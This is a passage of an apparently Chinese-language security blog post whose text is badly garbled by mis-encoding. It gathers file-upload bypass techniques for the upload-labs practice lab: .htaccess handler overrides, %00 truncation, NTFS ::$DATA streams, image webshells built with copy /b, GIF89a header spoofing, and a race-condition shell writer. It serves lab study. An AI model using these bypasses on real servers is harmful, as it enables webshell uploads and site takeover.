apacheæ”¯æŒä¸åŒºåˆ†å¤§å°å†™ï¼Œè¿™å°±è¦é€šè¿‡ speling_moduleæ¨¡å—äº†ã€‚è¿™æˆ‘ä»¬çŸ¥é“å°±å¥½äº†ã€‚</p><p>å®ä¾‹ï¼šupload labs Pass 5</p></li><li><p>Winä¸‹<code>xx.jpg[ç©ºæ ¼] æˆ– xx.jpg.</code>è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª<code>.phpç©ºæ ¼</code>æ–‡ä»¶å³å¯ã€‚éœ€è¦çŸ¥é“çš„æ˜¯ï¼Œå¦‚æœé»‘åå•å¯¹ä½ çš„åç¼€åè¿›è¡Œäº†å»ç‚¹ã€å»ç©ºæ ¼æ“ä½œï¼Œè¿™ç§æ–¹æ³•å°±ä¸å¤ªå¥½ä½¿äº†ã€‚å½“ç„¶ï¼Œå¦‚æœä»–çš„å»é™¤é€»è¾‘æœ‰é—®é¢˜ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç»•è¿‡ã€‚</p><p>å®ä¾‹ï¼šupload lab Pass 6ï¼ŒPass 7ï¼ŒPass 9</p></li><li><p>NTFSæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒã€‚è¿™ä¸æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åŠŸèƒ½ï¼Œä¸»è¦åŒ…æ‹¬æä¾›ä¸Macintoshæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶çš„å…¼å®¹æ€§ã€‚å¤‡ç”¨æ•°æ®æµå…è®¸æ–‡ä»¶åŒ…å«å¤šä¸ªæ•°æ®æµã€‚æ¯ä¸ªæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªæ•°æ®æµã€‚åœ¨Windowsä¸­ï¼Œæ­¤é»˜è®¤æ•°æ®æµç§°ä¸ºï¼š<code>$DATA</code>ã€‚ä¸Šä¼ <code>.php::$DATA</code>ç»•è¿‡ã€‚(ä»…é™windows)</p></li></ol><h2 id="é‡å†™æ–‡ä»¶è§£æè§„åˆ™">é‡å†™æ–‡ä»¶è§£æè§„åˆ™</h2><p>ä¸Šä¼ ä¸­é—´ä»¶çš„ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œæ˜¯è‡ªå·±çš„æ–‡ä»¶è¢«å¯¹åº”è„šæœ¬è¯­è¨€è§£æã€‚</p><p>Apache å½“åç¼€åæ²¡æœ‰è¿‡æ»¤ .htaccess æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼  <ahref="https://www.jianshu.com/p/81305ca91ebd">.htaccessæ–‡ä»¶</a>ï¼Œé€šè¿‡å®ƒæ¥é…ç½®æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¢« PHP è§£æã€‚</p><p>ä¸Šä¼  <code>.htaccess</code>æ–‡ä»¶éœ€è¦ï¼šhttpd.conf ä¸­çš„</p><p>1.<code>mod_rewriteæ¨¡å—å¼€å¯</code>ï¼Œè¿™ä¸ªä½œç”¨æ˜¯å…è®¸åœ¨ httpd.confå¤–é‡å†™é…ç½®</p><p>2.<code>AllowOverride All</code>ï¼Œè¿™ä¸ªä½œç”¨æ˜¯å…è®¸é‡å†™è¦†ç›–ç›¸å…³é…ç½®</p><p>æˆ‘ä»¬ä¸Šä¼ çš„ .htaccess æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">shell.jpg</span>&quot;&gt;</span></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯ï¼šåŒ¹é…æ–‡ä»¶ shell.jpgï¼Œå°†æ­¤åçš„æ–‡ä»¶éƒ½äº¤ç»™ PHP è§£æå¤„ç†ã€‚</p><p>è¿™ç§æ–¹æ³•åœ¨å®ƒä¼šéšæœºæ”¹ä¸Šä¼ æ–‡ä»¶çš„åå­—çš„æƒ…å†µä¸‹ï¼Œå°±ä¸å¥½ä½¿äº†ï¼ˆå¯ä»¥çœ‹çœ‹ Pass3ï¼Œå°±æ˜¯è¿™æ ·ï¼‰ã€‚ä¸€æ–¹é¢æ–‡ä»¶åæ”¹æˆäº†ç”±æ—¶é—´åç»„æˆçš„æ–‡ä»¶åï¼Œè¿™æ ·æˆ‘ä»¬çš„é…ç½®æ–‡ä»¶å½“ç„¶ä¸èƒ½ç”Ÿæ•ˆäº†ã€‚å¦ä¸€æ–¹é¢ï¼Œåœ¨é…ç½®æ–‡ä»¶æˆ‘ä»¬å†™çš„æ˜¯ï¼šå°†shell.jpg å½“åš php æ‰§è¡Œï¼Œå¯æ˜¯ï¼Œæˆ‘ä»¬çš„ shell.jpg ä¹Ÿè¢«æ”¹åå­—äº†ã€‚</p><p>å®ä¾‹ï¼š</p><p>upload labs Pass 2 ä¸ Pass 3 åˆ†åˆ«å¯¹åº”æ–¹æ³•ä¸€å’ŒäºŒã€‚</p><h1 id="è„šæœ¬è¯­è¨€å‡½æ•°ç‰¹æ€§">è„šæœ¬è¯­è¨€å‡½æ•°ç‰¹æ€§</h1><p>è¿™é‡Œå½“ç„¶æ˜¯æ‹¿ PHP æ¥ä¸¾ä¾‹äº†ã€‚</p><p>1.move_uploaded_file`å‡½æ•°çš„ 00 æˆªæ–­æ¼æ´ç»•è¿‡ã€‚</p><p>PHP ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´<ahref="https://www.cnblogs.com/cyjaysun/p/4390930.html">CVE-2015-2348æµ…æ</a></p><p>å¯¹äº GET æ–¹å¼ ä¼ è·¯å¾„</p><p>ä¸Šä¼ çš„æ–‡ä»¶åå†™æˆ<code>hello.jpg</code>, save_pathæ”¹æˆ<code>../upload/shell.php%00</code>ï¼Œæœ€åä¿å­˜ä¸‹æ¥çš„æ–‡ä»¶å°±æ˜¯<code>11.php</code>ã€‚</p><p><ahref="http://www.cnblogs.com/cyjaysun/p/4390930.html">CVE-2015-2348</a>å½±å“ç‰ˆæœ¬ï¼š<code>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7</code></p><p>å¯¹äº POST æ–¹å¼ä¼ è·¯å¾„ï¼Œç”±äº POST æ–¹å¼ä¸ä¼šè¿›è¡Œ URL è§£ç ï¼Œæˆ‘ä»¬éœ€è¦å°†%00è¿›è¡Œ URL Decode æˆ–è€…ç›´æ¥åœ¨ hex å¤„å¢åŠ  00ã€‚</p><p>ä¸Šä¼ æ–‡ä»¶åçš„åç¼€åæ”¹ä¸ºæ­£å¸¸çš„åç¼€åï¼Œ.jpgï¼Œç„¶åï¼Œåœ¨/upload/ åé¢åŠ ä¸ªshell.php+ï¼Œç„¶åï¼Œå» hex ä¸‹ï¼Œå°†+å¯¹åº”çš„ 2b æ”¹ä¸º 00 å› ä¸ºç”¨ postè·å–è·¯å¾„ï¼Œä¸ä¼šåƒ get ä¸€æ ·è‡ªåŠ¨ url è§£ç ã€‚æ‰€ä»¥ï¼Œç”¨ hex å°†ç©ºæ ¼ï¼ˆ20ï¼‰æ”¹ä¸º 00æˆ–è€… %00 å†å³é”® url decode</p><p>å®ä¾‹ï¼šUpload labs 11</p><p>2.åˆ©ç”¨<code>pathinfo</code>çš„ç‰¹æ€§ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="string">&quot;/testweb/shell.php/.&quot;</span>,PATHINFO_EXTENSION));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="string">&#x27;/testweb/shell.php\00.jpg&#x27;</span>,PATHINFO_EXTENSION));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;jpg&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨åç¼€ååé¢åŠ  <code>/.</code> pathinfoè·å–åˆ°ç©ºçš„åç¼€åï¼Œä»è€Œç»•è¿‡é»‘åå•ã€‚ç„¶å Window æ–‡ä»¶åç¼€åä¼šå»æ‰<code>/</code>ã€<code>.</code>åŠ`<code>ï¼Œå› æ­¤å®ƒå°±è¢«è¯†åˆ«ä¸ºäº† PHPã€‚å½“ç„¶ï¼Œåˆ©ç”¨</code>\00<code>ç»•è¿‡ï¼Œ</code>move_uploaded_file<code>ä¼šå¿½ç•¥åé¢çš„</code>.jpg`</p><p>å®ä¾‹ï¼šUpload labs Pass 19</p><p>3.<code>end</code>ä¸<code>count</code>çš„å‡½æ•°ç‰¹æ€§</p><p>end()å‡½æ•°å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ï¼ˆå¦‚æœæˆåŠŸï¼‰ã€‚</p><p>count() å‡½æ•°è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›®.</p><p>Pass 20 å…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">....</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p><code>end</code>å–çš„æ˜¯æ•°æ®çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæ— è®ºä¸‹æ ‡ï¼ˆæ„Ÿè§‰ PHPçš„æ•°ç»„æœ‰ç‚¹ç±»ä¼¼ C è¯­è¨€æ•°ç»„å’Œç»“æ„ä½“çš„åˆä½“ï¼Œhahaï¼‰ï¼Œ</p><p><code>count($arr)-1</code>å–çš„æ˜¯ä¸‹æ ‡ä¸ºæ€»ä¸ªæ•°ç®€æ˜“çš„å…ƒç´ ã€‚</p><p>resetå‡½æ•°å°†æ•°ç»„çš„æŒ‡é’ˆç§»åˆ°ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›å®ƒçš„å€¼ã€‚è¿™é‡Œæ˜¯ç”¨æ¥ä»æ•°ç»„ä¸­å–æ–‡ä»¶åå­—ã€‚</p><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;0&quot;</span>=&gt;<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;2&quot;</span>=&gt;<span class="string">&quot;php&quot;</span>, <span class="string">&quot;1&quot;</span>=&gt;<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>) - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;jpg&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;php&quot;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„é¡ºåºä¸æ˜¯æŒ‰ç…§å¯»å¸¸çš„é¡ºåºçš„ï¼Œæˆ‘ä»¬æ•…æ„æŠŠæœ€åä¸€ä¸ªå…ƒç´ æ’åœ¨äº†å‰é¢ä¸€ä½ï¼Œè¿™æ ·<code>end</code>å°±å–åˆ°äº†<code>jpg</code>åç¼€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>$_POST[save_name]</code>æ¥ç»•è¿‡æœ€ååç¼€æ£€æµ‹äº†</p><p>æ•°ç»„ç»•è¿‡ï¼Œåˆ©ç”¨ end å–æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œè€Œä»£ç æ˜¯å–ç´¢å¼•çš„æœ€åä¸€ä¸ªã€‚åˆ¤æ–­æ—¶ï¼Œåˆ¤æ–­æœ€åæŒ‡é’ˆçš„ä½ç½® save_name[2] ä¹Ÿå°±æ˜¯ jpgï¼Œäºæ˜¯ç»•è¿‡åç¼€åæ£€æŸ¥ã€‚æ‹¼æ¥æ–‡ä»¶åæ—¶ï¼Œä½¿ç”¨æ•°ç»„çš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆä½ç½®å³ï¼š<code>shell.php/</code>ä½œä¸ºæ–‡ä»¶åï¼Œä½¿ç”¨ä¸‹æ ‡ä¸º [å…ƒç´ ä¸ªæ•°-1]ï¼Œå³ï¼šç´¢å¼•ä¸º 1çš„æ•°ç»„ä¸­çš„å€¼ä½œä¸ºæ‰©å±•åï¼Œæˆ‘ä»¬è¿™é‡Œæ²¡æœ‰å†™ï¼Œå› æ­¤ä¸ºç©ºã€‚</p><p>ä¹‹åä½¿ç”¨<code>$file_name = reset($file) . '.' . $file[count($file) - 1];</code>æ‹¼æ¥æ–‡ä»¶åå°±æ˜¯<code>shell.php/</code>ã€‚ä½†æ˜¯ä½ çŸ¥é“ . åœ¨ windows ä¸­æ˜¯<code>/.</code>ä¼šè¢«å»é™¤çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åä¸ºï¼šåªéœ€è¦è®¿é—®ï¼š../upload/shell.phpå°±å¯ä»¥äº†</p><h1 id="ä¸­é—´ä»¶è§£ææ¼æ´">ä¸­é—´ä»¶è§£ææ¼æ´</h1><p>Apache è§£ææ¼æ´ä»å³å‘å·¦åˆ¤æ–­åç¼€åï¼Œä»è€Œåˆ¤æ–­èƒ½å¦è§£æã€‚</p><p>Apacheè§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚test.php.owf.rar â€œ.owfâ€å’Œâ€.rarâ€ è¿™ä¸¤ç§åç¼€æ˜¯ apache ä¸å¯è¯†åˆ«è§£æï¼Œapacheå°±ä¼šæŠŠ wooyun.php.owf.rar è§£ææˆ phpã€‚</p><p>ä¿®å¤æ–¹æ³•ï¼šè¦åœ¨é…ç½®æ–‡ä»¶é‡Œé¢ä¿®æ”¹ï¼Œå†™è§£ææ¼æ´çš„æ—¶å€™å†è¯¦ç»†è®²å§ã€‚</p><p>å®ä¾‹ï¼šupload lab Pass 19</p><h1 id="å›¾ç‰‡é©¬">å›¾ç‰‡é©¬</h1><p>å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬æ²¡æœ‰åˆ«çš„åŠæ³•äº†ï¼Œè¿™æ—¶å€™å°±åªèƒ½æ˜¯å›¾ç‰‡é©¬åŠ ä¸Šæ–‡ä»¶åŒ…å«æ¼æ´äº†ã€‚</p><p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç„¶åç¡®å®šå›¾ç‰‡ä¸æ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œåœ¨æ–‡ä»¶åŒ…å«çš„å‚æ•°ä¸­å†™ä¸Šå›¾ç‰‡é©¬çš„ç›¸å¯¹è·¯å¾„åŠåç§°ï¼Œç„¶åä½¿ç”¨èšå‰‘è¿æ¥å³å¯ã€‚</p><p>å›¾ç‰‡é©¬çš„åˆ¶ä½œï¼š</p><ol type="1"><li><p>å‘½ä»¤è¡Œ</p><ol type="1"><li><p>echo php ä»£ç  &gt;&gt; xx.jpg</p></li><li><p>copy æ–¹æ³• copy baidu.png /b + shell.php /abaidu_shell.png</p></li></ol></li><li><p>ç”¨è®°äº‹æœ¬æˆ– Notepad++ æˆ–è€… UltraEditæ‰“å¼€å›¾ç‰‡ï¼Œåœ¨æœ€åç²˜è´´ä»£ç å³å¯ã€‚</p></li></ol><p>åƒ upload labs Pass 13 è¦æ±‚çš„é‚£æ ·ï¼Œæˆ‘ä»¬ç”µè„‘ä¸Šä¸€èˆ¬éƒ½å¤‡å¥½ jpgï¼Œpngï¼Œgifä¸‰ç§å›¾ç‰‡é©¬ï¼Œç”¨çš„æ—¶å€™ç›´æ¥æ‹¿æ¥ç”¨å°±å¥½äº†ã€‚</p><p>æ³¨æ„ï¼šæœ‰äº›ç½‘ä¸Šçš„å›¾ç‰‡åšå›¾ç‰‡é©¬ä¸ä¼šæˆåŠŸï¼Œæœ€å¥½æ‰¾ä¸€äº›å…è´¹æ²¡ç‰ˆæƒçš„å›¾ç‰‡æ¥æ•´ã€‚å¦‚æœä½ çš„å›¾ç‰‡é©¬è§£æä¸äº†ï¼Œä¸å¦¨å¤šæ¢ä¸ªä¸ƒå…«å¼ ä¸ªå›¾ç‰‡è¯•è¯•emmã€‚ï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè®©ä½ ä»¥åå¤‡å¥½å›¾ç‰‡é©¬çš„åŸå› ï¼Œæ„Ÿè§‰å¥½åƒæ˜¯å›¾ç‰‡é—®é¢˜ï¼Œä¸æ˜¯æ‰€æœ‰çš„å›¾ç‰‡åšæˆå›¾ç‰‡é©¬ä¹‹åï¼Œéƒ½ä¼šè¢«æ­£å¸¸è§£æã€‚ï¼‰</p><h2 id="å¸¸è§å‡½æ•°">å¸¸è§å‡½æ•°ï¼š</h2><p>unpack() å‡½æ•°ä»äºŒè¿›åˆ¶å­—ç¬¦ä¸²å¯¹æ•°æ®è¿›è¡Œè§£åŒ…ï¼Œå¸¸ç”¨æ¥æ£€æµ‹æ–‡ä»¶å¤´ã€‚</p><p>å¯ä»¥é€šè¿‡æ·»åŠ å›¾ç‰‡çš„å¤´éƒ¨æ ‡è¯†ç»•è¿‡ï¼Œæ¯”å¦‚ï¼šæ·»åŠ  GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´<code>GIF89a</code>ï¼Œç»•è¿‡ GIF å›¾ç‰‡æ£€æŸ¥ã€‚</p><p>getimagesize()å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSEå¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚è¿”å›å€¼ä¸ºæ•°ç»„ï¼Œæ•°ç»„çš„ç´¢å¼• 2ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œæ¯ä¸ªæ•°å­—å¯¹åº”ä¸€ç§å›¾ç‰‡ç±»å‹ã€‚</p><p>stripos()å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p><p>exif_imagetype â€”åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹ï¼Œ<strong>exif_imagetype()</strong>è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</p><p>upload Pass 13 æ£€æµ‹æ–‡ä»¶å¤´ï¼ŒPass 14 æ£€æµ‹æ–‡ä»¶ç±»å‹ï¼ŒPass 15exif_imagetypeæ£€æµ‹é€šè¿‡æ£€æµ‹å›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥ç­¾åæ¥åˆ¤æ–­å›¾åƒç±»å‹ã€‚</p><h2 id="äºŒæ¬¡æ¸²æŸ“">äºŒæ¬¡æ¸²æŸ“</h2><p>ä¼˜å…ˆä½¿ç”¨ gifï¼Œå…¶æ¬¡ï¼Œjpgï¼Œæœ€å pngã€‚</p><p>å¯¹ gif çš„äºŒæ¬¡æ¸²æŸ“æ¥è¯´ï¼Œæˆ‘ä»¬ä¸Šä¼  gif å›¾ç‰‡ï¼Œç„¶åä¸‹è½½ï¼ŒæŒ‰ 16è¿›åˆ¶æŸ¥çœ‹ä¸‹è½½çš„å›¾ç‰‡ä¸åŸä¸Šä¼ çš„åŒºåˆ«ï¼Œç¡®å®šæ¸²æŸ“å¤„ç†éƒ¨åˆ†ã€‚å°†ä¸€å¥è¯æ’å…¥åˆ°æœªè¢«æ¸²æŸ“å¤„ç†çš„éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ å³å¯ã€‚</p><p>å¯¹äº jpg ä»¥åŠ png çš„å¤„ç†ï¼Œå¯ä»¥çœ‹<ahref="https://xz.aliyun.com/t/2657#toc-12">upload-labs ä¹‹ pass 16è¯¦ç»†åˆ†æ</a>ï¼Œæ„Ÿè§‰å¥½åƒäºŒè€…ç›¸æ¯”ï¼Œjpgæ›´ä¸ºç®€å•ï¼Œç›´æ¥è¿è¡Œå¤§ä½¬çš„è„šæœ¬å°±è¡Œäº†ã€‚</p><p>å®ä¾‹ï¼š</p><p>Upload labs Pass 16</p><p>è¿™é‡Œä¸è¯¦ç»†æäº†ï¼Œé‡åˆ°å†è¯´å§ã€‚</p><h1 id="æ¡ä»¶ç«äº‰">æ¡ä»¶ç«äº‰</h1><p>æ¡ä»¶ç«äº‰æ¼æ´æ˜¯ä¸€å¤§ç±»é€»è¾‘æ¼æ´ï¼Œä¸ä»…ä»…é™äºæ–‡ä»¶ä¸Šä¼ ï¼Œä¹Ÿå¸¸è§äºè½¬è´¦ç­‰äº¤æ˜“åœºæ™¯ã€‚</p><p>ä» Pass-17 æ¥çœ‹ï¼Œä»£ç æ˜¯å…ˆç§»åŠ¨æ–‡ä»¶åˆ° uploadæ–‡ä»¶å¤¹ï¼Œç„¶ååˆ¤æ–­åç¼€æ˜¯å¦åœ¨åå•ä¸­ï¼Œå†åˆ é™¤ä¸å¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€å®šçš„æ—¶é—´å·®æ¥è®¿é—®è‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶å¯¼è‡´å†™å…¥shell çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çš„ä»£ç å°±è¦ç¨å¾®æ”¹ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ”¹æˆå†™æ–‡ä»¶çš„ä»£ç ã€‚è¿™æ ·åªè¦æˆ‘ä»¬è®¿é—®åˆ°ä¸€æ¬¡ï¼Œæˆ‘ä»¬å°±ç”Ÿæˆäº†shell.php çš„ä¸€å¥è¯ï¼Œç„¶åå†å»è¿æ¥çˆ½æ­ªæ­ªã€‚</p><p>æ¡ä»¶ç«äº‰å¸¸ä½¿ç”¨ï¼šBurp Suiteã€Fiddle ç­‰æŠ“åŒ…å·¥å…·ï¼Œæˆ–è€…è‡ªå·±ç¼–å†™ Pythonè„šæœ¬æ¥æµ‹è¯•</p><p>ä½¿ç”¨ Burp intruder æ¨¡å—ï¼Œå¼€å¯ä¸¤ä¸ªAttackï¼Œä¸€ä¸ªä¸æ–­ä¸Šä¼ ï¼Œä¸€ä¸ªä¸æ–­è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆå½“ç„¶ï¼Œä½ è¦é¢„å…ˆèƒ½æ¨æµ‹å‡ºä¸Šä¼ åä½ çš„æ–‡ä»¶åä»¥åŠä½ç½®ã€‚ï¼‰ã€‚ä¸­é—´æˆ‘ä»¬éœ€è¦è®¾ç½®çº¿ç¨‹æ•°ï¼ˆå°†è®¿é—®çº¿ç¨‹å¼€çš„æ¯”ä¸Šä¼ çš„çº¿ç¨‹æ‰“å¤§ä¸€äº›ï¼Œæ¯”å¦‚ï¼š25:5ï¼‰ä»¥åŠè®¾ç½®Payload Type ä¸º nullpayloadï¼Œç„¶åè®¾ç½® PayloadOptionï¼ˆè®¾ç½®æ¿€å‘å¤šå°‘æ¬¡ï¼Œæˆ–è€…ä¸€ç›´æ”»å‡»ï¼‰ï¼Œä¸€èˆ¬æˆ‘éƒ½è®¾ç½®æˆä¸€ç›´æ”»å‡»ã€‚å…ˆå‘èµ·post ä¸Šä¼  attackï¼Œå†å‘èµ· get è®¿é—® attackã€‚ç„¶åæ ¹æ® getçš„è¿”å›é•¿åº¦åŠè¿”å›æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å‘ç°è®¿é—®æˆåŠŸä»¥åï¼Œä¾¿å»è®¿é—®åˆ›å»ºçš„shell.phpï¼ŒæŸ¥çœ‹å®ƒæ˜¯å¦è§£ææˆåŠŸï¼Œç„¶åç”¨å·¥å…·å»è¿æ¥ã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p>æ¥ä¸¤ä¸ªç®€å•çš„ï¼Œæ·±å±‚æ¬¡åˆ°æ“ä½œç³»ç»Ÿçš„ï¼Œå’±ä¹Ÿçœ‹ä¸æ‡‚ï¼Œå’±ä¹Ÿçœ‹ä¸ä¸‹å»å‘€ã€‚</p><p>å®ä¾‹ï¼šPass 17ï¼ŒPass 18</p><p><ahref="https://v0w.top/2018/08/16/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">æ¡ä»¶ç«äº‰</a></p><p><ahref="https://co0ontty.github.io/2019/04/12/batterupload.html">ç»“åˆ CTFè¯¦è§£æ¡ä»¶ç«äº‰æ¼æ´</a></p><p><ahref="https://mengsec.com/2018/04/07/Race-Condition/">æ¡ä»¶ç«äº‰ï¼ˆRaceConditionï¼‰</a></p><h1 id="æ€»ç»“å›é¡¾">æ€»ç»“å›é¡¾</h1><ol type="1"><li>è¦æ¥ç€å­¦ï¼Œä» Apache ä¸ PHP è¦è¡ç”Ÿåˆ°åˆ«çš„ç»„åˆ</li><li>ç†Ÿæ‚‰äº†è§£ä¸­é—´ä»¶çš„é…ç½®æ–‡ä»¶ä»¥åŠä¸€äº›å…³é”®é…ç½®ã€‚</li><li>è‡ªå·±æ­å»ºç¯å¢ƒã€‚å¤ç°ç›¸å…³è§£ææ¼æ´ã€‚</li></ol><h1 id="æ¨èé˜…è¯»">æ¨èé˜…è¯»</h1><p><ahref="https://klionsec.github.io/2017/11/13/ntfs-streams/">æ–‡ä»¶éšè— ä¹‹NTFS äº¤æ¢æ•°æ®æµ</a></p><p><ahref="https://blog.csdn.net/vivilorne/article/details/3841509">è°ˆè°ˆ NTFSæ•°æ®æµæ–‡ä»¶</a></p><p><a href="https://gh0st.cn/archives/2017-03-29/1">æ–‡ä»¶å¯„ç”Ÿâ€”â€”NTFSæ–‡ä»¶æµå®é™…åº”ç”¨</a></p><p><ahref="https://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">æœåŠ¡å™¨è§£ææ¼æ´</a></p><p><a href="https://xz.aliyun.com/t/4029#toc-7">Upload-labs 20å…³é€šå…³ç¬”è®°</a></p><p><ahref="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">æ–‡ä»¶è§£ææ¼æ´æ€»ç»“</a></p><p><ahref="https://www.anquanke.com/post/id/164561#h3-7">å¯¹æ–‡ä»¶ä¸Šä¼ çš„ä¸€äº›æ€è€ƒå’Œæ€»ç»“</a></p><p><ahref="https://paper.seebug.org/560/#2-filename">ç®€å•ç²—æš´çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> file_upload </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
